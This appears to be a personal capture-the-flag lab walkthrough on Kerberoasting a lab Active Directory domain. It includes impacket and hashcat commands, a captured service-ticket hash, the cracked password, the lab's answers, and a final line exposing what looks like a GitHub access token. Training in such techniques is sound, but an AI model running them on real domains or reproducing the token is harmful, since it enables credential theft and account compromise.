# With three heads you'd think they'd at least agree once 

- Upon looking through BloodHound queries, your team believes that you may have found a SQLService account that you can kerberoast and possibly use to access sql databases in the future.


# Kerberoasting Overview
- Kerberoasting allows a user to request a service ticket for any service with a registered SPN (Service Principle Name) and then use that ticket to crack the service password.
- If the service has a registered SPN then it can be Kerberoastable but the success of this attack comes down to `the strength of passwords and if the password is crackable as well as the privileges of the cracked service account`
- To enumerate Kerberoastable accounts, we use BloodHound to find all Kerberoastable accounts and also see what kinds of accounts we can kerberoast, if they are domain admins and what kind of connections do they have to the rest of the domain.


### We will use a tool called impacket for Kerberoasting process 

Go to the script
```shell
cd /usr/share/doc/python3-impacket/examples
```

```
proxychains sudo python3 GetUserSPNs.py -dc-ip 10.200.34.117 THROWBACK.local/user:password -request
```

- We can use any valid set of credentials on the workstation to kerberoast with

![[Pasted image 20221016133022.png]]
- The service which we can kerberoast was SQLService.
```
ServicePrincipalName                         Name        MemberOf  PasswordLastSet      LastLogon           
-------------------------------------------  ----------  --------  -------------------  -------------------
TB-ADMIN-DC/SQLService.THROWBACK.local:6792  SQLService            2020-07-27 11:20:08  2020-07-27 11:26:43 
```

- We got the service ticket for SQLService here as follows

```
$krb5tgs$23$*SQLService$THROWBACK.LOCAL$TB-ADMIN-DC/SQLService.THROWBACK.local~6792*$2ec07fb9279f09a04cfed1c74d47754e$94b053fdd025aa5c8f4c48687e7ad96ca4b3903ca0f99e09632afffce06cb9d4fb6e8e01a0f1affc6d6119e6bca2749a5334ecf324c6a14ff62cae1544f59fb2495cf258ae5b09b8e81be93b96daee1803c9e04d0b3d1fb7badf54bb059a89e759d77556e8decffe42c8c556a36e27f04430a6a06a690ffc2bef89688c2be42b6f33d59bdd247a1c597cb69f04e03876f8752520b128955ec5fd8730807d5a87394c7ae3b4fe2e078552dd151cfaede700027a8a72d46bd2ee3b8258355440e02947ce79d7c182e0ddc630ef031cb0d0af39ddc453dcbcd5d21132c918c3ddd35670e16f4dd5b6cbfc21f675833a12d1031ade810e99e4ac7a8574ab76df7e7358ae167a0932060f01b88089a5b3c55e090cdaa94929e3edd8d6b64775f2f34b5ea2e95c43b5bcf9ce27d68ccc2d69fd6a64db221ab4791f6979c9ddfd7fcb058d3fc4ce0659bf746d10f15f09d59a044fac5ec5a64685257c8617989eb14923fe25aeacc738b6189ff4cd50f68cf302cc42a1ceac3fdbe9212880ecf9695f043f04205409af06fa99499115ff4d227bd3c65e71ad2f359fd67c46e031710d38723aca52783d74af76c074f85602b1b1308e495d71c87bdfdd1392acee985355e256f81e40336fb4e574eaab2ee63919d3d1e9b2465c42b48a9e7e5db428f2f774399bae7de7995938fc4f418e015dfa541fddb5fc575bbbe89959594f403da60d03981061972a6b3b968c0b6ebe1e903e893f43d0067c7edac7e2cd739333a0946f23cbe74d64b9a1bf577461962a96030027f6a8851a4891b0f4b6b8b90bdd5cd686600a241628707566345390850506cf1e4d1376ee6cfb11d8a36592d748c56f90ee7d68e84c3fbefd3d51f61ba22dbb9d51fc758e1759c01ddd67aaf5b902af469e89c276b0e8864de9628ef1d4194f8876f37f0cb2f1faa2a86a8fa4803983abb801df7f477811b121d0171d7134b5c7721d21a76bcc190987304888a37c3316aa8656fb3d4a26213f7f0142fe7f6d3ef61e587a2ff8645fb55b68022830a792065bdfba628d54b34401def15918b05ff9ccec76168169c05a3f9ce625ecf0a0347e87f3ca444eb6fd9f08403de1f24b5248061f6fc892a1d060796b9326205743b03ac4e2ed2831512b2ce5b5be49ce0265c75167aadf4fef7a4b73bc46d557fb552449331d472970b73cb2f5a34c82e629e7e5bca1bef58425567415aa12fe0fa61fac36697478c0e4370200e2500661e73e2a7223c4e70986b710201a8486ff6c4e2fe065f27085958be1a0e9407e9fb009378c1ead78af6776b228b443decc4d861b87a2f39b2482bcff1f25c77e6c7ecb357f026f7eedb2e356b961a7e7f412a5f77edeaaeb7f3d48ff
```

- Now we can crack this service ticket using hashcat module `13100`

```shell
hashcat -m 13100 service_hash.txt rockyou.txt
```

![[Pasted image 20221016133524.png]]
- So here got the hash cracked as `"mysql337570"`

Now that we have the SQLService password we have come to another dead end, we need to go back and find other open devices in the network to compromise and maybe find a SQL database to use our newly compromised password in.



## Questions
1.  What account was compromised by kerberoasting?
`SQLService`

2. What password was cracked from the retrieved ticket?
`mysql337570`


`Gitbook Token - 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`

